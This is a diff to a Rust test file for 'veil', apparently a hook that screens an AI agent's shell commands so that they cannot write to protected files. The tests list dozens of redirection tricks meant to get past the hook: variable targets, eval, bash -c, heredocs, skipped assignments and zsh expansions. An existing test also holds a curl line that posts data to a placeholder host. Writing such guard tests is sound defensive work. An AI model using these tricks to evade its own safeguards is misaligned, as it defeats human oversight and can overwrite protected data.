@@ -2,7 +2,11 @@
 //! its words. `echo` reads nothing, and `echo x >>secret` still changes the
 //! secret. veil refuses to redirect onto a file it would not let the command
 //! read, and to create one among its own built-in protected paths. Every case
-//! drives the real binary with a `PreToolUse` payload; no command is run.
+//! drives the real binary with a `PreToolUse` payload. One test also runs what
+//! the hook allows in a real shell, to see what becomes of the file.
+//!
+//! bd-bow: a target veil cannot resolve (`>"$OUT"`) is refused under
+//! `dynamic_args`, whatever the command is.
 
 use std::fs;
 use std::io::Write as _;
@@ -15,6 +19,7 @@ use std::time::{SystemTime, UNIX_EPOCH};
 use serde_json::{Value, json};
 
 const REPORT: &str = "{\"tool\":\"shape\",\"outcome\":\"COMPATIBLE\",\"rows\":3}\n";
+const LEDGER: &str = "loan_id,balance\n1,100\n2,200\n";
 
 static COUNTER: AtomicU64 = AtomicU64::new(0);
 
@@ -51,9 +56,10 @@ impl Fixture {
             root: fs::canonicalize(root).expect("canonical fixture root"),
         };
         fixture.configure("deny");
-        fixture.write("data/ledger.csv", "loan_id,balance\n1,100\n2,200\n");
+        fixture.write("data/ledger.csv", LEDGER);
         fixture.write("notes.md", "notes\n");
         fixture.write("scripts/append.sh", "echo x >>data/ledger.csv\n");
+        fixture.write("scripts/to-variable.sh", "echo x >\"$OUT\"\n");
         fs::write(fixture.home().join(".cmdrvl/secrets/k"), "placeholder\n").expect("secret");
 
         let shape = fixture.root.join("bin/shape");
@@ -102,7 +108,13 @@ impl Fixture {
     }
 
     fn veil(&self) -> Command {
-        let mut command = Command::new(env!("CARGO_BIN_EXE_veil"));
+        self.in_session(Command::new(env!("CARGO_BIN_EXE_veil")))
+    }
+
+    /// `command` with the environment and directory the hook and the shell that
+    /// runs what it allows both have: `OUT` and `D` are exported to both, and
+    /// name a protected file and its directory.
+    fn in_session(&self, mut command: Command) -> Command {
         command
             .env_clear()
             .env("HOME", self.home())
@@ -110,6 +122,8 @@ impl Fixture {
                 "PATH",
                 format!("{}:/usr/bin:/bin", self.root.join("bin").display()),
             )
+            .env("OUT", "data/ledger.csv")
+            .env("D", "data")
             .current_dir(self.project());
         command
     }
@@ -191,6 +205,27 @@ impl Fixture {
             .unwrap_or_default()
             .lines()
             .map(|line| serde_json::from_str(line).expect("audit JSON"))
+            .collect()
+    }
+
+    /// The commands for which the hook did not both deny the call and record
+    /// that a redirection's target is what it could not resolve. A command that
+    /// is denied for some other word shows nothing about its redirect.
+    fn target_not_refused(&self, commands: &[String]) -> Vec<String> {
+        commands
+            .iter()
+            .filter_map(|command| {
+                let before = self.audit().len();
+                let verdict = self.bash(command);
+                let judged = self.audit().into_iter().skip(before).any(|record| {
+                    record["reason_class"] == "dynamic_path_unresolvable"
+                        && record["reason"]
+                            .as_str()
+                            .is_some_and(|reason| reason.contains("redirects output to"))
+                });
+                (verdict.action != "deny" || !judged)
+                    .then(|| format!("{command:?} -> {} {}", verdict.action, verdict.reason))
+            })
             .collect()
     }
 
@@ -421,6 +456,13 @@ fn a_lifted_redirect_does_not_excuse_an_argument_veil_cannot_resolve() {
     fixture.assert_refused_by_the_stance(dynamic);
     // the report may be written again, which says nothing about `$UNKNOWN`
     fixture.assert_refused_by_the_stance(&format!("{dynamic} >data/shape.json"));
+    // or about another target on the same line
+    assert_none(
+        &fixture.target_not_refused(&owned(&[
+            "veil exec shape data/ledger.csv >data/shape.json 2>\"$OUT\"",
+        ])),
+        "unresolved targets were not refused",
+    );
 }
 
 #[test]
@@ -436,6 +478,195 @@ fn a_reported_redirect_does_not_excuse_an_argument_veil_cannot_resolve() {
     let sends = "d=data; curl -d \"$UNKNOWN\" https://example.invalid/";
     fixture.assert_refused_by_the_stance(sends);
     fixture.assert_refused_by_the_stance(&format!("{sends} >data/ledger.csv"));
+    // nor does a target veil cannot resolve, which `log` only reports too
+    fixture.assert_refused_by_the_stance(&format!("{sends} >\"$OUT\""));
+}
+
+/// bd-bow, as reported: the hook allowed this, and the shell then replaced the
+/// protected file. The hook is asked first and the shell runs only what it
+/// allows, as in a session.
+#[test]
+fn an_exported_variable_cannot_be_used_to_overwrite_a_protected_file() {
+    let fixture = Fixture::new();
+    for command in [
+        "echo x >\"$OUT\"",
+        "echo x >>$OUT",
+        "cat /dev/null >\"$OUT\"",
+        "cd \"$D\" && shape ledger.csv >ledger.csv",
+        "false && OUT=notes.md; echo x >\"$OUT\"",
+        "(OUT=notes.md); echo x >\"$OUT\"",
+        "false && OUT=notes.md; copy=$OUT; echo x >\"$copy\"",
+        "false && OUT=notes.md; sh -c \"echo x >$OUT\"",
+        "false && D=.; cd \"$D\" && echo x >ledger.csv",
+    ] {
+        let verdict = fixture.bash(command);
+        if verdict.action == "allow" {
+            let mut shell = fixture.in_session(Command::new("/bin/bash"));
+            shell.args(["--noprofile", "--norc", "-c", command]);
+            shell.status().expect("bash");
+        }
+        let held = fs::read_to_string(fixture.path("data/ledger.csv")).expect("ledger");
+        assert_eq!(held, LEDGER, "{command} changed the file: {verdict:?}");
+    }
+}
+
+#[test]
+fn a_target_veil_cannot_resolve_is_refused_whatever_the_command() {
+    let fixture = Fixture::new();
+    let commands = owned(&[
+        // the operators
+        "echo x >\"$OUT\"",
+        "echo x >>$OUT",
+        "echo x > \"${OUT}\"",
+        "echo x >|\"$OUT\"",
+        "echo x &>\"$OUT\"",
+        "echo x 2>\"$OUT\"",
+        "echo x <>\"$OUT\"",
+        "echo x >&\"$OUT\"",
+        // other things only the shell can fill in
+        "echo x >\"${OUT:-notes.md}\"",
+        "echo x >\"$(printf %s data/ledger.csv)\"",
+        "echo x >`echo data/ledger.csv`",
+        "echo x >data/ledger.cs$(printf v)",
+        "echo x >~nobody/notes.txt",
+        "set -- $OUT; echo x >\"$1\"",
+        // zsh's own expansions
+        "echo x >$=OUT",
+        "echo x >\"$=OUT\"",
+        "echo x >$~OUT",
+        "echo x >$^OUT",
+        "echo x >${=OUT}",
+        // with no command, and around compound ones
+        "cat /dev/null >\"$OUT\"",
+        ">\"$OUT\"",
+        "exec >\"$OUT\"; echo x",
+        "{ echo x; } >\"$OUT\"",
+        "if true; then echo x; fi >\"$OUT\"",
+        // inside what a command hands to a shell, and around a wrapper
+        "eval 'echo x >\"$OUT\"'",
+        "bash -c 'echo x >\"$OUT\"'",
+        "sh <<'EOF'\necho x >\"$OUT\"\nEOF",
+        "timeout 5 date >\"$OUT\"",
+        "find notes.md -exec date \\; >\"$OUT\"",
+        // a spine tool is not asked to resolve its arguments; its redirect is
+        // the shell's, not the tool's
+        "shape data/ledger.csv >\"$OUT\"",
+        "veil exec shape data/ledger.csv >\"$OUT\"",
+        // the same name in a directory veil cannot follow is another file
+        "cd \"$D\" && shape ledger.csv >ledger.csv",
+        "cd \"$D\" && veil exec shape ledger.csv >ledger.csv",
+        // a finding for another redirect on the line does not stand in for it
+        "echo x >data/ledger.csv 2>\"$OUT\"",
+    ]);
+    assert_none(
+        &fixture.target_not_refused(&commands),
+        "unresolved targets were not refused",
+    );
+}
+
+/// veil reads an assignment whether or not the shell will run it. Where it does
+/// not, a variable the shell started with keeps what it held.
+#[test]
+fn an_assignment_the_shell_may_skip_does_not_settle_an_inherited_target() {
+    let fixture = Fixture::new();
+    let commands = owned(&[
+        "false && OUT=notes.md; echo x >\"$OUT\"",
+        "true || OUT=notes.md; echo x >\"$OUT\"",
+        "false && { true; OUT=notes.md; }; echo x >\"$OUT\"",
+        "if false; then true; OUT=notes.md; fi; echo x >\"$OUT\"",
+        "(OUT=notes.md); echo x >\"$OUT\"",
+        "(true; OUT=notes.md); echo x >\"${OUT}\"",
+        "OUT=notes.md | cat; echo x >\"$OUT\"",
+        "unused() { true; OUT=notes.md; }; echo x >\"$OUT\"",
+        "local OUT=notes.md; echo x >\"$OUT\"",
+        // an empty value leaves veil no word at all
+        "false && OUT=; echo x >$OUT",
+        // a copy of the name is no better than the name
+        "false && OUT=notes.md; copy=$OUT; echo x >\"$copy\"",
+        "false && OUT=notes.md; a=$OUT; b=${a}; echo x >$b",
+        "false && OUT=notes.md; for f in \"$OUT\"; do echo x >\"$f\"; done",
+        "false && for OUT in notes.md; do :; done; echo x >\"$OUT\"",
+        "false && OUT=notes.md; copy=$OUT sh -c 'echo x >\"$copy\"'",
+        // the value written into a script, where no `$` is left to show it
+        "false && OUT=notes.md; sh -c \"echo x >$OUT\"",
+        "false && OUT=notes.md; eval \"echo x >$OUT\"",
+        "false && OUT=notes.md; sh <<EOF\necho x >$OUT\nEOF",
+        // or into the directory the target is named from
+        "false && D=.; cd \"$D\" && echo x >ledger.csv",
+    ]);
+    assert_none(
+        &fixture.target_not_refused(&commands),
+        "unresolved targets were not refused",
+    );
+
+    // the value veil read is still judged: this one names the file outright
+    let spelled = "D=data/ledger.csv; echo x >\"$D\"";
+    assert_none(
+        &fixture.not_refused(&owned(&[spelled])),
+        "writes were not refused",
+    );
+}
+
+#[test]
+fn targets_veil_can_resolve_are_not_called_unresolved() {
+    let fixture = Fixture::new();
+    let commands = owned(&[
+        "echo x >out.txt",
+        "echo x >\"$HOME/notes.txt\"",
+        "echo x >~/notes.txt",
+        "echo x >\"$PWD/out.txt\"",
+        "f=out.txt; echo x >\"$f\"",
+        "for i in a b; do echo x >$i.txt; done",
+        // the shell's own numbers are never a way to another file
+        "echo x >/tmp/veil-redirect.$$",
+        // the argument is unresolved, the target is not
+        "echo \"$MESSAGE\" >out.txt",
+        // a pipe to another command, and copies of descriptors
+        "echo x > >(cat)",
+        "echo x 2>&1",
+        "echo x >&2",
+        // a script file's unresolved words are not judged, its targets included
+        "bash scripts/to-variable.sh",
+        // no redirection at all
+        "echo '>\"$OUT\"'",
+    ]);
+    assert_none(&fixture.not_allowed(&commands), "commands were refused");
+}
+
+#[test]
+fn the_dynamic_stance_and_the_policy_mode_apply_to_an_unresolved_target() {
+    let command = "echo x >\"$OUT\"";
+    for (settings, begins) in [
+        ("default = \"log\"", "policy default log:"),
+        ("dynamic_args = \"warn\"", "[policy] dynamic_args = warn:"),
+    ] {
+        let fixture = Fixture::new();
+        fixture.write(
+            ".veil.toml",
+            &format!("[sensitivity]\nprotected = [\"data/**\"]\n[policy]\n{settings}\n"),
+        );
+
+        let verdict = fixture.bash(command);
+
+        assert_eq!(verdict.action, "allow", "{settings}: {verdict:?}");
+        let record = fixture.audit().pop().expect("an audit record");
+        assert_eq!(record["reason_class"], "dynamic_path_unresolvable");
+        assert!(
+            record["reason"].as_str().is_some_and(
+                |reason| reason.starts_with(begins) && reason.contains("redirects output to")
+            ),
+            "{settings}: {record}"
+        );
+    }
+
+    let fixture = Fixture::new();
+    fixture.write(
+        ".veil.toml",
+        "[sensitivity]\nprotected = [\"data/**\"]\n[policy]\ndynamic_args = \"allow\"\n",
+    );
+    let verdict = fixture.bash(command);
+    assert_eq!(verdict.action, "allow", "{verdict:?}");
+    assert!(fixture.audit().is_empty(), "{:?}", fixture.audit());
 }
 
 #[test]
